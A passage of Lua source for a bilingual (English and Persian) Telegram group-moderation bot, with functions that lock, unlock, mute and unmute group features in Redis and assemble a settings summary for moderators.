      redis:del("CheckDaily" .. NAME .. ":GP:" .. msg.to.id)
      redis:del("CheckDailyExpire" .. NAME .. ":GP:" .. msg.to.id)
    end
    if not lang then
      return LockTextEN(msg, NameEN, UL_2EN)
    elseif lang then
      return LockTextFA(msg, NameFA, UL_2FA)
    end
  else
    if NAME == "flood" then
      redis:hset("GroupSettings:" .. msg.to.id, NAME, "yes")
    else
      redis:hset("GroupSettings:" .. msg.to.id, "lock_" .. NAME, "yes")
    end
    if VAR == true then
      redis:del("CheckDaily" .. NAME .. ":GP:" .. msg.to.id)
    end
    if not lang then
      return LockTextEN(msg, NameEN, L_2EN)
    else
      return LockTextFA(msg, NameFA, L_2FA)
    end
  end
end
local lock_item2 = function(msg, NAME, EN, FA, VAR)
  local NameEN = EN
  local NameFA = FA
  local hash = "gp_lang:" .. msg.to.id
  local lang = redis:get(hash)
  if not is_mod(msg) then
    if not lang then
      return accessEN(msg)
    else
      return accessFA(msg)
    end
  end
  if NAME == "flood" then
    L = redis:hget("GroupSettings:" .. msg.to.id, NAME)
  else
    L = redis:hget("GroupSettings:" .. msg.to.id, "lock_" .. NAME)
  end
  if L == "yes" then
    if not lang then
      return LockTextEN(msg, NameEN, L_1EN)
    elseif lang then
      return LockTextFA(msg, NameFA, L_1FA)
    end
  else
    if NAME == "flood" then
      redis:hset("GroupSettings:" .. msg.to.id, NAME, "yes")
    else
      redis:hset("GroupSettings:" .. msg.to.id, "lock_" .. NAME, "yes")
    end
    if VAR == true then
      redis:del("CheckDaily" .. NAME .. ":GP:" .. msg.to.id)
    end
    if not lang then
      return LockTextEN(msg, NameEN, L_2EN)
    else
      return LockTextFA(msg, NameFA, L_2FA)
    end
  end
end
local unlock_item = function(msg, NAME, EN, FA, VAR)
  local NameEN = EN
  local NameFA = FA
  local hash = "gp_lang:" .. msg.to.id
  local lang = redis:get(hash)
  if not is_mod(msg) then
    if not lang then
      return accessEN(msg)
    else
      return accessFA(msg)
    end
  end
  if NAME == "flood" then
    L = redis:hget("GroupSettings:" .. msg.to.id, NAME)
  else
    L = redis:hget("GroupSettings:" .. msg.to.id, "lock_" .. NAME)
  end
  if L == "yes" then
    if NAME == "flood" then
      redis:hdel("GroupSettings:" .. msg.to.id, NAME)
    else
      redis:hdel("GroupSettings:" .. msg.to.id, "lock_" .. NAME)
    end
    if VAR == true then
      redis:del("CheckDaily" .. NAME .. ":GP:" .. msg.to.id)
      redis:del("CheckDailyExpire" .. NAME .. ":GP:" .. msg.to.id)
    end
    if not lang then
      return LockTextEN(msg, NameEN, UL_2EN)
    elseif lang then
      return LockTextFA(msg, NameFA, UL_2FA)
    end
  elseif not lang then
    return LockTextEN(msg, NameEN, UL_1EN)
  else
    return LockTextFA(msg, NameFA, UL_1FA)
  end
end
function group_settings(msg, target)
  local hash = "gp_lang:" .. msg.to.id
  local lang = redis:get(hash)
  if not is_mod(msg) then
    if not lang then
      return accessEN(msg)
    else
      return accessFA(msg)
    end
  end
  local target = msg.to.id
  local mute_all = "no"
  local mute_gif = "no"
  local mute_text = "no"
  local mute_photo = "no"
  local mute_video = "no"
  local mute_audio = "no"
  local mute_voice = "no"
  local mute_sticker = "no"
  local mute_contact = "no"
  local mute_forward = "no"
  local mute_location = "no"
  local mute_document = "no"
  local mute_tgservice = "no"
  local mute_inline = "no"
  local mute_game = "no"
  local mute_keyboard = "no"
  local lock_link = "no"
  local lock_tag = "no"
  local lock_mention = "no"
  local lock_arabic = "no"
  local lock_edit = "no"
  local lock_spam = "no"
  local lock_flood = "no"
  local lock_bots = "no"
  local lock_markdown = "no"
  local lock_webpage = "no"
  local lock_pin = "no"
  local lock_MaxWords = "no"
  local lock_botchat = "no"
  local lock_fohsh = "no"
  local lock_english = "no"
  local lock_forcedinvite = "no"
  local lock_username = redis:hget("GroupSettings:" .. target, "lock_username") or "no"
  local lock_join = redis:hget("GroupSettings:" .. target, "lock_join") or "no"
  local lock_note = redis:hget("GroupSettings:" .. target, "lock_note") or "no"
  if redis:hget("GroupSettings:" .. target, "mute_all") == "yes" then
    mute_all = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_gif") == "yes" then
    mute_gif = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_text") == "yes" then
    mute_text = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_photo") == "yes" then
    mute_photo = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_video") == "yes" then
    mute_video = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_audio") == "yes" then
    mute_audio = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_voice") == "yes" then
    mute_voice = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_sticker") == "yes" then
    mute_sticker = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_contact") == "yes" then
    mute_contact = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_forward") == "yes" then
    mute_forward = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_location") == "yes" then
    mute_location = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_document") == "yes" then
    mute_document = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_tgservice") == "yes" then
    mute_tgservice = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_inline") == "yes" then
    mute_inline = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_game") == "yes" then
    mute_game = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "mute_keyboard") == "yes" then
    mute_keyboard = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "num_msg_max") then
    NUM_MSG_MAX = tonumber(redis:hget("GroupSettings:" .. target, "num_msg_max"))
  else
    NUM_MSG_MAX = 5
  end
  if redis:hget("GroupSettings:" .. target, "MaxWords") then
    MaxWords = tonumber(redis:hget("GroupSettings:" .. target, "MaxWords"))
  else
    MaxWords = 50
  end
  if redis:hget("GroupSettings:" .. target, "MaxWarn") then
    MaxWarn = tonumber(redis:hget("GroupSettings:" .. target, "MaxWarn"))
  else
    MaxWarn = 5
  end
  if redis:hget("GroupSettings:" .. target, "FloodTime") then
    FloodTime = tonumber(redis:hget("GroupSettings:" .. target, "FloodTime"))
  else
    FloodTime = 30
  end
  if redis:hget("GroupSettings:" .. target, "ForcedInvite") then
    ForcedInvite = tonumber(redis:hget("GroupSettings:" .. target, "ForcedInvite"))
  else
    ForcedInvite = 2
  end
  if redis:hget("GroupSettings:" .. target, "lock_link") == "yes" then
    lock_link = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_tag") == "yes" then
    lock_tag = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_mention") == "yes" then
    lock_mention = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_arabic") == "yes" then
    lock_arabic = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_edit") == "yes" then
    lock_edit = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_spam") == "yes" then
    lock_spam = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "flood") == "yes" then
    lock_flood = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_bots") == "yes" then
    lock_bots = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_markdown") == "yes" then
    lock_markdown = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_webpage") == "yes" then
    lock_webpage = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_pin") == "yes" then
    lock_pin = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_MaxWords") == "yes" then
    lock_MaxWords = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_botchat") == "yes" then
    lock_botchat = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_fohsh") == "yes" then
    lock_fohsh = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_english") == "yes" then
    lock_english = "yes"
  end
  if redis:hget("GroupSettings:" .. target, "lock_forcedinvite") == "yes" then
    lock_forcedinvite = "yes"
  end
  local expire_date = ""
  local expi = redis:ttl("ExpireDate:" .. msg.to.id)
  if expi == -1 then
    if lang then
      expire_date = "\217\134\216\167\217\133\216\173\216\175\217\136\216\175!"
    else
      expire_date = "Unlimited!"
    end
  else
    local day = math.floor(expi / 86400) + 1
    if lang then
      expire_date = day
    else
      expire_date = day .. " Days"
    end
  end
  local cmdss = redis:get("GroupCmdsAccess:" .. msg.to.id)
  if lang then
    if cmdss == "owner" then
      cmdsss = "\216\181\216\167\216\173\216\168 \218\175\216\177\217\136\217\135 \217\136 \216\168\216\167\217\132\216\167\216\170\216\177"
    elseif cmdss == "moderator" then
      cmdsss = "\217\133\216\175\219\140\216\177\216\167\217\134 \218\175\216\177\217\136\217\135 \217\136 \216\168\216\167\217\132\216\167\216\170\216\177"
    else
      cmdsss = "\216\162\216\178\216\167\216\175 \216\168\216\177\216\167\219\140 \217\135\217\133\217\135"
    end
  elseif cmdss == "owner" then
    cmdsss = "Owner and Higher"
  elseif cmdss == "moderator" then
    cmdsss = "Moderators and Higher"
  else
    cmdsss = "Members and Higher"
  end
  if redis:get("sense:" .. msg.to.id) then
    CheckSense = "\226\152\145\239\184\143"
  else
    CheckSense = "\226\154\160\239\184\143"
  end
  if redis:get("SettingsWelcomeFor" .. msg.to.id) then
    if redis:get("GroupWelcome" .. msg.to.id) then
      CheckWelcome = "\226\156\133"
    else
      CheckWelcome = "\226\152\145\239\184\143"
    end
  else
    CheckWelcome = "\226\157\140"
  end
  AddSettings = redis:smembers("GroupAddSettings:" .. msg.to.id)
  if #AddSettings ~= 0 then
    function GetAddedSettings(msg)
      SetName = ""
      for k, v in pairs(AddSettings) do
        if redis:get("AppliedAddSettings:" .. msg.to.id .. ":" .. v) then
          Status = "yes"
        else
          Status = "no"
        end
        SetName = SetName .. [[

`]] .. k .. "-` " .. v .. ": " .. Status
      end
      return SetName
    end
    if not lang then
      AddSettingsName = [[


*Added Private Settings:*
]] .. GetAddedSettings(msg)
    else
      AddSettingsName = "\n\n\216\170\217\134\216\184\219\140\217\133\216\167\216\170 \216\174\216\181\217\136\216\181\219\140 \216\167\216\182\216\167\217\129\217\135 \216\180\216\175\217\135:\n" .. GetAddedSettings(msg)
    end
  else
    AddSettingsName = ""
  end
  if not lang then
    if not redis:get("EditBot:settingsEN") then
      NewLocks = mute_all .. " `\194\187\194\187\194\187 Lock all`\n" .. mute_gif .. " `\194\187\194\187\194\187 Lock gif`\n" .. mute_text .. " `\194\187\194\187\194\187 Lock text`\n" .. mute_inline .. " `\194\187\194\187\194\187 Lock inline`\n" .. mute_game .. " `\194\187\194\187\194\187 Lock game`\n" .. mute_photo .. " `\194\187\194\187\194\187 Lock photo`\n" .. mute_video .. " `\194\187\194\187\194\187 Lock video`\n" .. mute_audio .. " `\194\187\194\187\194\187 Lock audio`\n" .. mute_voice .. " `\194\187\194\187\194\187 Lock voice`\n" .. mute_sticker .. " `\194\187\194\187\194\187 Lock sticker`\n" .. mute_contact .. " `\194\187\194\187\194\187 Lock contact`\n" .. mute_forward .. " `\194\187\194\187\194\187 Lock forward`\n" .. mute_location .. " `\194\187\194\187\194\187 Lock location`\n" .. mute_document .. " `\194\187\194\187\194\187 Lock document`\n" .. mute_tgservice .. " `\194\187\194\187\194\187 Lock tgservice`\n" .. mute_keyboard .. " `\194\187\194\187\194\187 Lock keyboard`\n" .. lock_botchat .. " `\194\187\194\187\194\187 Lock bot chat`\n" .. lock_fohsh .. " `\194\187\194\187\194\187 Lock fohsh`\n" .. lock_english .. " `\194\187\194\187\194\187 Lock English`\n" .. lock_forcedinvite .. " `\194\187\194\187\194\187 Lock Forced Invite`\n" .. lock_username .. " `\194\187\194\187\194\187 Lock UserName (@)`\n" .. lock_join .. " `\194\187\194\187\194\187 Lock Join`\n" .. lock_note .. " `\194\187\194\187\194\187 Lock Video Note`\n"
      DefaultLocks = "[\226\154\153\239\184\143]*Settings:*\n\n[\240\159\148\146] Default locks:\n" .. lock_edit .. " `\194\187\194\187\194\187 Lock edit` \n" .. lock_link .. " `\194\187\194\187\194\187 Lock link` \n" .. lock_tag .. " `\194\187\194\187\194\187 Lock tags` \n" .. lock_flood .. " `\194\187\194\187\194\187 Lock flood` \n" .. lock_spam .. " `\194\187\194\187\194\187 Lock spam` \n" .. lock_mention .. " `\194\187\194\187\194\187 Lock mention` \n" .. lock_arabic .. " `\194\187\194\187\194\187 Lock arabic` \n" .. lock_webpage .. " `\194\187\194\187\194\187 Lock webpage` \n" .. lock_markdown .. " `\194\187\194\187\194\187 Lock markdown` \n" .. lock_pin .. " `\194\187\194\187\194\187 Lock pin message` \n" .. lock_MaxWords .. " `\194\187\194\187\194\187 Lock Max Words` \n" .. lock_bots .. " `\194\187\194\187\194\187 Bots protection` \n\n[\240\159\148\143] New locks:\n" .. NewLocks .. "\n[\240\159\148\167] OTHER:\n" .. NUM_MSG_MAX .. " *\194\187\194\187\194\187 Flood sensitivity* \n" .. MaxWords .. " *\194\187\194\187\194\187 Number of Allowed Words* \n" .. MaxWarn .. " *\194\187\194\187\194\187 Max warn* \n" .. FloodTime .. " *\194\187\194\187\194\187 Flood Time*\n*Bot Commands:* " .. cmdsss .. [[

*Expire:* ]] .. expire_date .. [[

*Number of Forced invite Member:* ]] .. ForcedInvite .. "\n*Group Language:* \240\159\135\172\240\159\135\167\n*Artificial Sense:* " .. CheckSense .. [[

*Group Welcome:* ]] .. CheckWelcome .. "" .. AddSettingsName
    else
      DefaultLocks = redis:get("EditBot:settingsEN") .. "" .. AddSettingsName
      DefaultLocks = DefaultLocks:gsub("LANG", "\240\159\135\172\240\159\135\167")
      DefaultLocks = DefaultLocks:gsub("NUMBEROFFLOOD", NUM_MSG_MAX)
      DefaultLocks = DefaultLocks:gsub("NUMBEROFMAXWORDS", MaxWords)
      DefaultLocks = DefaultLocks:gsub("NUMBEROFMAXWARN", MaxWarn)
      DefaultLocks = DefaultLocks:gsub("NUMBEROFFORCEDINVITE", ForcedInvite)
      DefaultLocks = DefaultLocks:gsub("EXPIRE", expire_date)
      DefaultLocks = DefaultLocks:gsub("SENSE", CheckSense)
      DefaultLocks = DefaultLocks:gsub("WELCOME", CheckWelcome)
      DefaultLocks = DefaultLocks:gsub("USERNAME", lock_username)
      DefaultLocks = DefaultLocks:gsub("LINK", lock_link)
      DefaultLocks = DefaultLocks:gsub("TAG", lock_tag)
      DefaultLocks = DefaultLocks:gsub("MENTION", lock_mention)
      DefaultLocks = DefaultLocks:gsub("ARABIC", lock_arabic)
      DefaultLocks = DefaultLocks:gsub("EDIT", lock_edit)
      DefaultLocks = DefaultLocks:gsub("SPAM", lock_spam)
      DefaultLocks = DefaultLocks:gsub("FLOODTIME", FloodTime)
      DefaultLocks = DefaultLocks:gsub("FLOOD", lock_flood)
      DefaultLocks = DefaultLocks:gsub("BOTS", lock_bots)
      DefaultLocks = DefaultLocks:gsub("MARKDOWN", lock_markdown)
      DefaultLocks = DefaultLocks:gsub("WEBPAGE", lock_webpage)
      DefaultLocks = DefaultLocks:gsub("PIN", lock_pin)
      DefaultLocks = DefaultLocks:gsub("MAXWORDS", lock_MaxWords)
      DefaultLocks = DefaultLocks:gsub("BOTCHAT", lock_botchat)
      DefaultLocks = DefaultLocks:gsub("CMDS", cmdsss)
      DefaultLocks = DefaultLocks:gsub("ALL", mute_all)
      DefaultLocks = DefaultLocks:gsub("GIF", mute_gif)
      DefaultLocks = DefaultLocks:gsub("TEXT", mute_text)
      DefaultLocks = DefaultLocks:gsub("PHOTO", mute_photo)
      DefaultLocks = DefaultLocks:gsub("VIDEO", mute_video)
      DefaultLocks = DefaultLocks:gsub("AUDIO", mute_audio)
      DefaultLocks = DefaultLocks:gsub("VOICE", mute_voice)
      DefaultLocks = DefaultLocks:gsub("STICKER", mute_sticker)
      DefaultLocks = DefaultLocks:gsub("CONTACT", mute_contact)
      DefaultLocks = DefaultLocks:gsub("FORWARD", mute_forward)
      DefaultLocks = DefaultLocks:gsub("LOCATION", mute_location)
      DefaultLocks = DefaultLocks:gsub("DOCUMENT", mute_document)
      DefaultLocks = DefaultLocks:gsub("TGSERVICE", mute_tgservice)
      DefaultLocks = DefaultLocks:gsub("INLINE", mute_inline)
      DefaultLocks = DefaultLocks:gsub("GAME", mute_game)
      DefaultLocks = DefaultLocks:gsub("KEYBOARD", mute_keyboard)
      DefaultLocks = DefaultLocks:gsub("FOHSH", lock_fohsh)
      DefaultLocks = DefaultLocks:gsub("ENGLISH", lock_english)
      DefaultLocks = DefaultLocks:gsub("FORCEDINVITE", lock_forcedinvite)
      DefaultLocks = DefaultLocks:gsub("JOIN", lock_join)
      DefaultLocks = DefaultLocks:gsub("NOTE", lock_note)
    end
  elseif not redis:get("EditBot:settingsFA") then
    NewLocks = mute_all .. " `\194\187\194\187\194\187 \217\130\217\129\217\132 \217\135\217\133\217\135`\n" .. mute_gif .. " `\194\187\194\187\194\187 \217\130\217\129\217\132 \218\175\219\140\217\129`\n" .. mute_text .. " `\194\187\194\187\194\187 \217\130\217\129\217\132 \217\133\216\170\217\134`\n" .. mute_inline .. " `\194\187\194\187\194\187 \217\130\217\129\217\132 \216\167\219\140\217\134\217\132\216\167\219\140\217\134`\n" .. mute_game .. " `\194\187\194\187\194\187 \217\130\217\129\217\132 \216\168\216\167\216\178\219\140 \217\135\216\167\219\140 \216\162\217\134\217\132\216\167\219\140\217\134`\n" .. mute_photo .. " `\194\187\194\187\194\187 \217\130\217\129\217\132 \216\185\218\169\216\179`\n" .. mute_video .. " `\194\187\194\187\194\187 \217\130\217\129\217\132 \217\129\219\140\217\132\217\133`\n" .. mute_audio .. " `\194\187\194\187\194\187 \217\130\217\129\217\132 \216\162\217\135\217\134\218\175`\n" .. mute_voice .. " `\194\187\194\187\194\187 \217\130\217\129\217\132 \216\181\216\175\216\167`\n" .. mute_sticker .. " `\194\187\194\187\194\187 \217\130\217\129\217\132 \216\167\216\179\216\170\219\140\218\169\216\177`\n" .. mute_contact .. " `\194\187\194\187\194\187 \217\130\217\129\217\132 \217\133\216\174\216\167\216\183\216\168`\n" .. mute_forward .. " `\194\187\194\187\194\187 \217\130\217\129\217\132 \217\129\217\136\216\177\217\136\216\167\216\177\216\175`\n" .. mute_location .. " `\194\187\194\187\194\187 \217\130\217\129\217\132 \217\133\218\169\216\167\217\134`\n" .. mute_document .. " `\194\187\194\187\194\187 \217\130\217\129\217\132 \217\129\216\167\219\140\217\132`\n" .. mute_tgservice .. " `\194\187\194\187\194\187 \217\130\217\129\217\132 \216\174\216\175\217\133\216\167\216\170 \216\170\217\132\218\175\216\177\216\167\217\133`\n" .. mute_keyboard .. " `\194\187\194\187\194\187 \217\130\217\129\217\132 \216\181\217\129\216\173\217\135 \218\169\217\132\219\140\216\175`\n" .. lock_botchat .. " `\194\187\194\187\194\187 \217\130\217\129\217\132 \218\134\216\170 \216\177\216\168\216\167\216\170`\n" .. lock_fohsh .. " `\194\187\194\187\194\187 \217\130\217\129\217\132 \217\129\216\173\216\180`\n" .. lock_english .. " `\194\187\194\187\194\187 \217\130\217\129\217\132 \216\167\217\134\218\175\217\132\219\140\216\179\219\140`\n" .. lock_forcedinvite .. " `\194\187\194\187\194\187 \217\130\217\129\217\132 \216\175\216\185\217\136\216\170 \216\167\216\172\216\168\216\167\216\177\219\140`\n" .. lock_username .. " `\194\187\194\187\194\187 \217\130\217\129\217\132 \219\140\217\136\216\178\216\177\217\134\219\140\217\133 (@)`\n" .. lock_join .. " `\194\187\194\187\194\187 \217\130\217\129\217\132 \217\136\216\177\217\136\216\175`\n" .. lock_note .. " `\194\187\194\187\194\187 \217\130\217\129\217\132 \217\190\219\140\216\167\217\133 \217\136\219\140\216\175\216\166\217\136\219\140\219\140`\n"
    DefaultLocks = "[\226\154\153\239\184\143]*\216\170\217\134\216\184\219\140\217\133\216\167\216\170:*\n\n[\240\159\148\146] \217\130\217\129\217\132 \217\135\216\167\219\140 \217\190\219\140\216\180\217\129\216\177\216\182:\n" .. lock_edit .. " `\194\187\194\187\194\187 \217\130\217\129\217\132 \216\167\216\175\219\140\216\170` \n" .. lock_link .. " `\194\187\194\187\194\187 \217\130\217\129\217\132 \217\132\219\140\217\134\218\169` \n" .. lock_tag .. " `\194\187\194\187\194\187 \217\130\217\129\217\132 \216\170\218\175` \n" .. lock_flood .. " `\194\187\194\187\194\187 \217\130\217\129\217\132 \217\190\219\140\216\167\217\133 \216\177\218\175\216\168\216\167\216\177\219\140` \n" .. lock_spam .. " `\194\187\194\187\194\187 \217\130\217\129\217\132 \216\167\216\179\217\190\217\133` \n" .. lock_mention .. " `\194\187\194\187\194\187 \217\130\217\129\217\132 \217\133\217\134\216\180\217\134` \n" .. lock_arabic .. " `\194\187\194\187\194\187 \217\130\217\129\217\132 \216\185\216\177\216\168\219\140` \n" .. lock_webpage .. " `\194\187\194\187\194\187 \217\130\217\129\217\132 \216\181\217\129\216\173\216\167\216\170 \217\136\216\168` \n" .. lock_markdown .. " `\194\187\194\187\194\187 \217\130\217\129\217\132 \217\129\217\136\217\134\216\170` \n" .. lock_pin .. " `\194\187\194\187\194\187 \217\130\217\129\217\132 \216\179\217\134\216\172\216\167\217\130` \n" .. lock_MaxWords .. " `\194\187\194\187\194\187 \217\130\217\129\217\132 \216\173\216\175\216\167\218\169\216\171\216\177 \218\169\217\132\217\133\216\167\216\170` \n" .. lock_bots .. " `\194\187\194\187\194\187 \216\173\217\129\216\167\216\184\216\170 \216\175\216\177 \216\168\216\177\216\167\216\168\216\177 \216\177\216\168\216\167\216\170 \217\135\216\167` \n\n[\240\159\148\143] \217\130\217\129\217\132 \217\135\216\167\219\140 \216\172\216\175\219\140\216\175:\n" .. NewLocks .. "\n[\240\159\148\167] \216\175\219\140\218\175\216\177:\n*\216\173\216\179\216\167\216\179\219\140\216\170 \217\190\219\140\216\167\217\133 \216\177\218\175\216\168\216\167\216\177\219\140:* " .. NUM_MSG_MAX .. "\n*\216\170\216\185\216\175\216\167\216\175 \217\133\216\172\216\167\216\178 \218\169\217\132\217\133\216\167\216\170:*\n" .. MaxWords .. "\n\216\173\216\175\216\167\218\169\216\171\216\177 \216\167\216\174\216\183\216\167\216\177: " .. MaxWarn .. "\n\216\178\217\133\216\167\217\134 \217\190\219\140\216\167\217\133 \216\177\218\175\216\168\216\167\216\177\219\140: " .. FloodTime .. "\n*\216\175\216\179\216\170\217\136\216\177\216\167\216\170 \216\177\216\168\216\167\216\170:* " .. cmdsss .. "\n*\216\167\217\134\217\130\216\182\216\167:* " .. expire_date .. "\n\216\170\216\185\216\175\216\167\216\175 \216\175\216\185\217\136\216\170 \216\167\216\172\216\168\216\167\216\177\219\140 \216\185\216\182\217\136: " .. ForcedInvite .. "\n*\216\178\216\168\216\167\217\134 \218\175\216\177\217\136\217\135:* \240\159\135\174\240\159\135\183\n*\217\135\217\136\216\180 \217\133\216\181\217\134\217\136\216\185\219\140:* " .. CheckSense .. "\n*\216\174\217\136\216\180 \216\162\217\133\216\175 \218\175\217\136\219\140\219\140 \218\175\216\177\217\136\217\135:* " .. CheckWelcome .. "" .. AddSettingsName
  else
    DefaultLocks = redis:get("EditBot:settingsFA") .. "" .. AddSettingsName
    DefaultLocks = DefaultLocks:gsub("LANG", "\240\159\135\174\240\159\135\183")
    DefaultLocks = DefaultLocks:gsub("NUMBEROFFLOOD", NUM_MSG_MAX)
    DefaultLocks = DefaultLocks:gsub("NUMBEROFMAXWORDS", MaxWords)
    DefaultLocks = DefaultLocks:gsub("NUMBEROFMAXWARN", MaxWarn)
    DefaultLocks = DefaultLocks:gsub("NUMBEROFFORCEDINVITE", ForcedInvite)
    DefaultLocks = DefaultLocks:gsub("EXPIRE", expire_date)
    DefaultLocks = DefaultLocks:gsub("SENSE", CheckSense)
    DefaultLocks = DefaultLocks:gsub("WELCOME", CheckWelcome)
    DefaultLocks = DefaultLocks:gsub("USERNAME", lock_username)
    DefaultLocks = DefaultLocks:gsub("LINK", lock_link)
    DefaultLocks = DefaultLocks:gsub("TAG", lock_tag)
    DefaultLocks = DefaultLocks:gsub("MENTION", lock_mention)
    DefaultLocks = DefaultLocks:gsub("ARABIC", lock_arabic)
    DefaultLocks = DefaultLocks:gsub("EDIT", lock_edit)
    DefaultLocks = DefaultLocks:gsub("SPAM", lock_spam)
    DefaultLocks = DefaultLocks:gsub("FLOODTIME", FloodTime)
    DefaultLocks = DefaultLocks:gsub("FLOOD", lock_flood)
    DefaultLocks = DefaultLocks:gsub("BOTS", lock_bots)
    DefaultLocks = DefaultLocks:gsub("MARKDOWN", lock_markdown)
    DefaultLocks = DefaultLocks:gsub("WEBPAGE", lock_webpage)
    DefaultLocks = DefaultLocks:gsub("PIN", lock_pin)
    DefaultLocks = DefaultLocks:gsub("MAXWORDS", lock_MaxWords)
    DefaultLocks = DefaultLocks:gsub("BOTCHAT", lock_botchat)
    DefaultLocks = DefaultLocks:gsub("CMDS", cmdsss)
    DefaultLocks = DefaultLocks:gsub("ALL", mute_all)
    DefaultLocks = DefaultLocks:gsub("GIF", mute_gif)
    DefaultLocks = DefaultLocks:gsub("TEXT", mute_text)
    DefaultLocks = DefaultLocks:gsub("PHOTO", mute_photo)
    DefaultLocks = DefaultLocks:gsub("VIDEO", mute_video)
    DefaultLocks = DefaultLocks:gsub("AUDIO", mute_audio)
    DefaultLocks = DefaultLocks:gsub("VOICE", mute_voice)
    DefaultLocks = DefaultLocks:gsub("STICKER", mute_sticker)
    DefaultLocks = DefaultLocks:gsub("CONTACT", mute_contact)
    DefaultLocks = DefaultLocks:gsub("FORWARD", mute_forward)
    DefaultLocks = DefaultLocks:gsub("LOCATION", mute_location)
    DefaultLocks = DefaultLocks:gsub("DOCUMENT", mute_document)
    DefaultLocks = DefaultLocks:gsub("TGSERVICE", mute_tgservice)
    DefaultLocks = DefaultLocks:gsub("INLINE", mute_inline)
    DefaultLocks = DefaultLocks:gsub("GAME", mute_game)
    DefaultLocks = DefaultLocks:gsub("KEYBOARD", mute_keyboard)
    DefaultLocks = DefaultLocks:gsub("FOHSH", lock_fohsh)
    DefaultLocks = DefaultLocks:gsub("ENGLISH", lock_english)
    DefaultLocks = DefaultLocks:gsub("FORCEDINVITE", lock_forcedinvite)
    DefaultLocks = DefaultLocks:gsub("JOIN", lock_join)
    DefaultLocks = DefaultLocks:gsub("NOTE", lock_note)
  end
  if not redis:get("EditBot:lockemoji") then
    DefaultLocks = string.gsub(DefaultLocks, "yes", "\240\159\148\144")
  else
    DefaultLocks = DefaultLocks:gsub("yes", redis:get("EditBot:lockemoji"))
  end
  if not redis:get("EditBot:unlockemoji") then
    DefaultLocks = string.gsub(DefaultLocks, "no", "\240\159\148\147")
  else
    DefaultLocks = DefaultLocks:gsub("no", redis:get("EditBot:unlockemoji"))
  end
  return DefaultLocks
end
local mute_item = function(msg, NAME, EN, FA, VAR)
  local NameEN = EN
  local NameFA = FA
  local hash = "gp_lang:" .. msg.to.id
  local lang = redis:get(hash)
  if not is_mod(msg) then
    if not lang then
      return accessEN(msg)
    else
      return accessFA(msg)
    end
  end
  L = redis:hget("GroupSettings:" .. msg.to.id, "mute_" .. NAME)
  if L == "yes" then
    redis:hdel("GroupSettings:" .. msg.to.id, "mute_" .. NAME)
    if NAME == "all" then
      redis:del("currentChat:" .. msg.to.id)
      redis:del("maxChat:" .. msg.to.id)
    end
    if VAR == true then
      redis:del("CheckDaily" .. NAME .. ":GP:" .. msg.to.id)
      redis:del("CheckDailyExpire" .. NAME .. ":GP:" .. msg.to.id)
    end
    if not lang then
      return LockTextEN(msg, NameEN, UL_2EN)
    elseif lang then
      return LockTextFA(msg, NameFA, UL_2FA)
    end
  else
    redis:hset("GroupSettings:" .. msg.to.id, "mute_" .. NAME, "yes")
    if VAR == true then
      redis:del("CheckDaily" .. NAME .. ":GP:" .. msg.to.id)
    end
    if not lang then
      return LockTextEN(msg, NameEN, L_2EN)
    else
      return LockTextFA(msg, NameFA, L_2FA)
    end
  end
end
local mute_item2 = function(msg, NAME, EN, FA, VAR)
  local NameEN = EN
  local NameFA = FA
  local hash = "gp_lang:" .. msg.to.id
  local lang = redis:get(hash)
  if not is_mod(msg) then
    if not lang then
      return accessEN(msg)
    else
      return accessFA(msg)
    end
  end
  L = redis:hget("GroupSettings:" .. msg.to.id, "mute_" .. NAME)
  if L == "yes" then
    if not lang then
      return LockTextEN(msg, NameEN, L_1EN)
    elseif lang then
      return LockTextFA(msg, NameFA, L_1FA)
    end
  else
    redis:hset("GroupSettings:" .. msg.to.id, "mute_" .. NAME, "yes")
    if VAR == true then
      redis:del("CheckDaily" .. NAME .. ":GP:" .. msg.to.id)
    end
    if not lang then
      return LockTextEN(msg, NameEN, L_2EN)
    else
      return LockTextFA(msg, NameFA, L_2FA)
    end
  end
end
local unmute_item = function(msg, NAME, EN, FA, VAR)
  local NameEN = EN
  local NameFA = FA
  local hash = "gp_lang:" .. msg.to.id
  local lang = redis:get(hash)
  if not is_mod(msg) then
    if not lang then
      return accessEN(msg)
    else
      return accessFA(msg)
    end
  end
  L = redis:hget("GroupSettings:" .. msg.to.id, "mute_" .. NAME)
  if L == "yes" then
    redis:hdel("GroupSettings:" .. msg.to.id, "mute_" .. NAME)
    if NAME == "all" then
      redis:del("currentChat:" .. msg.to.id)
      redis:del("maxChat:" .. msg.to.id)
    end
    if VAR == true then
      redis:del("CheckDaily" .. NAME .. ":GP:" .. msg.to.id)
      redis:del("CheckDailyExpire" .. NAME .. ":GP:" .. msg.to.id)
    end
    if not lang then
      return LockTextEN(msg, NameEN, UL_2EN)
    elseif lang then
      return LockTextFA(msg, NameFA, UL_2FA)
    end
  elseif not lang then
    return LockTextEN(msg, NameEN, UL_1EN)
  else
    return LockTextFA(msg, NameFA, UL_1FA)
